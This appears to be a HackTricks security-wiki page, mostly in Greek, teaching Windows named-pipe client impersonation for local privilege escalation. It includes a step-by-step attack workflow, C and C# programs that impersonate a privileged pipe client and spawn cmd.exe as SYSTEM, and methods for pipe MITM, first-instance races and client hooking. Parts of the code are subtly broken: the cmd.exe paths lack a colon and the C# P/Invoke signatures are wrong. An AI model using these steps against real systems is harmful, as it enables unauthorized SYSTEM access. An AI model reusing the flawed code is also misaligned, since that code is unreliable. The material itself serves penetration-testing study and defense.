# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Το Named Pipe client impersonation είναι ένα local privilege escalation primitive που επιτρέπει σε ένα thread του named-pipe server να υιοθετήσει το security context ενός client που συνδέεται σε αυτό. Στην πράξη, ένας attacker που μπορεί να εκτελέσει κώδικα με SeImpersonatePrivilege μπορεί να εξαναγκάσει έναν privileged client (π.χ. μια υπηρεσία SYSTEM) να συνδεθεί σε ένα pipe που ελέγχει ο attacker, να καλέσει το ImpersonateNamedPipeClient, να αντιγράψει το token που προκύπτει σε primary token και να εκκινήσει μια process ως ο client (συχνά NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Αυτή η σελίδα εστιάζει στην core technique. Για end-to-end exploit chains που εξαναγκάζουν το SYSTEM να συνδεθεί στο pipe σας, δείτε τις σελίδες της οικογένειας Potato που αναφέρονται παρακάτω.

## TL;DR
- Δημιουργήστε ένα named pipe: \\.\pipe\<random> και περιμένετε για σύνδεση.
- Κάντε ένα privileged component να συνδεθεί σε αυτό (spooler/DCOM/EFSRPC/etc.).
- Διαβάστε τουλάχιστον ένα μήνυμα από το pipe και, στη συνέχεια, καλέστε το ImpersonateNamedPipeClient.
- Ανοίξτε το impersonation token από το current thread, καλέστε DuplicateTokenEx(TokenPrimary) και CreateProcessWithTokenW/CreateProcessAsUser για να αποκτήσετε μια SYSTEM process.<sup>[[2]](#references)</sup>

## Requirements and key APIs
- Privileges που απαιτούνται συνήθως από το calling process/thread:
- SeImpersonatePrivilege για επιτυχή impersonation ενός client που συνδέεται και για τη χρήση του CreateProcessWithTokenW.
- Εναλλακτικά, μετά το impersonation του SYSTEM, μπορείτε να χρησιμοποιήσετε το CreateProcessAsUser, το οποίο ενδέχεται να απαιτεί SeAssignPrimaryTokenPrivilege και SeIncreaseQuotaPrivilege (αυτά ικανοποιούνται όταν κάνετε impersonating το SYSTEM).
- Core APIs που χρησιμοποιούνται:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (πρέπει να διαβάσετε τουλάχιστον ένα μήνυμα πριν από το impersonation)
- ImpersonateNamedPipeClient και RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ή CreateProcessAsUser
- Impersonation level: για να εκτελέσει χρήσιμες ενέργειες locally, ο client πρέπει να επιτρέπει το SecurityImpersonation (προεπιλογή για πολλά local RPC/named-pipe clients). Οι clients μπορούν να το μειώσουν χρησιμοποιώντας SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION κατά το άνοιγμα του pipe.<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Σημειώσεις:
- Αν το ImpersonateNamedPipeClient επιστρέψει ERROR_CANNOT_IMPERSONATE (1368), βεβαιωθείτε ότι πρώτα διαβάσατε από το pipe και ότι ο client δεν περιόρισε το impersonation στο επίπεδο Identification.
- Προτιμήστε το DuplicateTokenEx με SecurityImpersonation και TokenPrimary, για να δημιουργήσετε ένα primary token κατάλληλο για τη δημιουργία process.

## Σύντομο παράδειγμα .NET
Στο .NET, το NamedPipeServerStream μπορεί να εκτελέσει impersonation μέσω του RunAsClient. Μόλις γίνει το impersonation, κάντε duplicate το thread token και δημιουργήστε ένα process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Συνήθη triggers/coercions για να οδηγήσετε το SYSTEM στο pipe σας
Αυτές οι τεχνικές εξαναγκάζουν privileged services να συνδεθούν στο named pipe σας, ώστε να μπορείτε να τα impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Δείτε αναλυτική χρήση και compatibility εδώ:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Αν χρειάζεστε ένα πλήρες παράδειγμα δημιουργίας του pipe και impersonation για spawn SYSTEM μέσω service trigger, δείτε:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Όταν ένα privileged service και μια low-privileged process επικοινωνούν μέσω του `\\.\pipe\...`, αντιμετωπίστε το pipe όπως οποιοδήποτε άλλο untrusted IPC boundary. Πέρα από το κλασικό server-side impersonation, τα weak pipe ACLs, τα unsafe creation flags και οι client-side trust decisions μπορούν επίσης να αποτελέσουν local privilege escalation primitives.<sup>[[7]](#references)</sup>

### Κάντε πρώτα enumerate τα candidate pipes
- Κάντε γρήγορα list τα pipes από το PowerShell: `Get-ChildItem \\.\pipe\`
- Το Sysinternals `pipelist64.exe` είναι χρήσιμο για τον εντοπισμό instance counts και single-instance pipes.
- Δώστε προτεραιότητα σε names που χρησιμοποιούνται από services τα οποία εκτελούνται ως `SYSTEM`, ειδικά helpers, updaters, launchers και UI brokers.

### MITM μέσω permissive DACLs και extra pipe instances
- Οποιαδήποτε process μπορεί να μιλήσει με έναν privileged server μπορεί ήδη να κάνει fuzz το protocol του και να αναζητήσει privileged verbs.<sup>[[7]](#references)</sup>
- Η πιο ενδιαφέρουσα περίπτωση είναι όταν το DACL εκχωρεί `FILE_GENERIC_WRITE`/`GENERIC_WRITE` στο pipe object. Στα named pipes αυτό περιλαμβάνει implicit το `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` χρησιμοποιεί το ίδιο bit), επομένως ένας attacker μπορεί να δημιουργήσει άλλο server instance με το ίδιο name.
- Επειδή τα instances αντιστοιχίζονται με σειρά FIFO, τα attacker-created και legitimate instances μπορούν να interleave: δημιουργήστε ένα rogue instance με `CreateNamedPipe`, έπειτα ανοίξτε το ίδιο pipe name με `CreateFile` και περιμένετε έναν πραγματικό client να συνδεθεί στο rogue server instance.
- Αποτέλεσμα: παρατήρηση, τροποποίηση, relay ή desynchronization privileged IPC χωρίς να χρειάζεται να έχετε τον έλεγχο της αρχικής server process.

### First-instance race στα pipe security descriptors
- Το `lpSecurityAttributes` ορίζει το DACL μόνο όταν δημιουργείται το πρώτο instance ενός pipe name.<sup>[[4]](#references)[[7]](#references)</sup>
- Αν ένα privileged service ξεκινά αργότερα και δεν χρησιμοποιεί το `FILE_FLAG_FIRST_PIPE_INSTANCE`, ένας attacker μπορεί να δημιουργήσει εκ των προτέρων το pipe name με permissive DACL και στη συνέχεια να αφήσει το service να δημιουργήσει μεταγενέστερα instances υπό το security context που επέλεξε ο attacker.
- Αυτό μετατρέπει το service startup σε race condition: κερδίστε το first instance και έπειτα συνδεθείτε ή κάντε MITM σε μεταγενέστερους clients χρησιμοποιώντας το weakened ACL.
- Mitigation για defenders και βασικό review point για attackers: ελέγξτε αν το `CreateNamedPipe(..., dwOpenMode, ...)` περιλαμβάνει το `FILE_FLAG_FIRST_PIPE_INSTANCE`. Αν όχι, δοκιμάστε pre-creation πριν ξεκινήσει το service.

### Οι PID/signature checks είναι hardening, όχι boundary
- Ορισμένα products προσπαθούν να περιορίσουν την πρόσβαση ελέγχοντας το `GetNamedPipeClientProcessId`, το process image path ή τον Authenticode signer του connecting client.<sup>[[7]](#references)</sup>
- Αυτό βοηθά μόνο μέχρι να κάνετε injection στη legitimate client: μόλις βρεθείτε μέσα στην trusted process, κληρονομείτε ακριβώς το PID/image/signature context που αναμένει ο server.
- Για split desktop apps, το instrumenting της low-privileged UI/helper process είναι συχνά ευκολότερο από την απευθείας επίθεση στο `SYSTEM` service.

### Κάντε hook στον client σύμφωνα με το I/O model του
- Synchronous I/O: κάντε intercept το `NtWriteFile` πριν το syscall καταναλώσει το buffer και κάντε inspect/patch το `NtReadFile` αφού επιστρέψει.<sup>[[7]](#references)</sup>
- Overlapped I/O: αποθηκεύστε το `OVERLAPPED`/`IoStatusBlock` που εμφανίζεται στο `NtReadFile` και έπειτα κάντε inspect το buffer μετά την ολοκλήρωση του `GetOverlappedResult` ή του σχετικού wait.
- Completion ports: το `GetQueuedCompletionStatus` καταλήγει στο `NtRemoveIoCompletion`· το επιστρεφόμενο `ApcContext` συνδέεται με το `OVERLAPPED` που χρησιμοποιήθηκε από το original read, αποτελώντας το σωστό pivot για τον εντοπισμό του πλέον συμπληρωμένου buffer.
- Completion routines (`ReadFileEx`): το completion callback παραδίδεται ως APC. Αν θέλετε να κάνετε tamper στα returned data ή να inject synthetic replies, κάντε hook την πραγματική completion routine και, για custom injection, χρησιμοποιήστε έναν one-argument `QueueUserAPC` dispatcher που ανακατασκευάζει τα 3 αναμενόμενα arguments της routine.<sup>[[5]](#references)[[7]](#references)</sup>

### Tooling notes
- Το [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) κάνει proxy το named-pipe traffic μέσω ενός injected helper DLL και προσφέρει workflow τύπου Burp για editing/replay.<sup>[[6]](#references)</sup>
- Το [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) χρησιμοποιεί προσέγγιση βασισμένη στο Frida και επικεντρώνεται στο hooking των `NtReadFile`/`NtWriteFile` μαζί με τα παραπάνω async/completion pivots, προωθώντας έπειτα το traffic σε WebSocket-backed editing workflow.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Επιχειρησιακές considerations
- Τα Named pipes έχουν χαμηλό latency· οι μεγάλες παύσεις κατά την επεξεργασία buffers μπορεί να προκαλέσουν deadlock σε εύθραυστες υπηρεσίες.<sup>[[7]](#references)</sup>
- Οι clients που βασίζονται σε overlapped/completion-port/APC χρειάζονται διαφορετικά hooks από τα απλά detours των `ReadFile`/`WriteFile`.
- Το injection στον trusted client είναι θορυβώδες και γενικά είναι προτιμότερο να περιορίζεται σε exploit development, protocol reversing ή local lab fuzzing.

## Troubleshooting και παγίδες
- Πρέπει να διαβάσετε τουλάχιστον ένα message από το pipe πριν καλέσετε το ImpersonateNamedPipeClient· διαφορετικά θα λάβετε ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Αν ο client συνδεθεί με SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, ο server δεν μπορεί να πραγματοποιήσει πλήρες impersonation· ελέγξτε το impersonation level του token μέσω του GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- Το CreateProcessWithTokenW απαιτεί SeImpersonatePrivilege από τον caller. Αν αποτύχει με ERROR_PRIVILEGE_NOT_HELD (1314), χρησιμοποιήστε το CreateProcessAsUser αφού πρώτα έχετε κάνει impersonation του SYSTEM.
- Βεβαιωθείτε ότι το security descriptor του pipe επιτρέπει στον target service να συνδεθεί, αν το hardenάρετε· από προεπιλογή, τα pipes κάτω από το \\.\pipe είναι προσβάσιμα σύμφωνα με το DACL του server.<sup>[[3]](#references)</sup>

## References

- [1] [Windows: Τεκμηρίωση του ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Privilege escalation με Windows named pipes](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Ασφάλεια και δικαιώματα πρόσβασης Named Pipe](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: Συνάρτηση CreateNamedPipe](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server με χρήση Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – εργαλείο Windows named pipe proxy](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
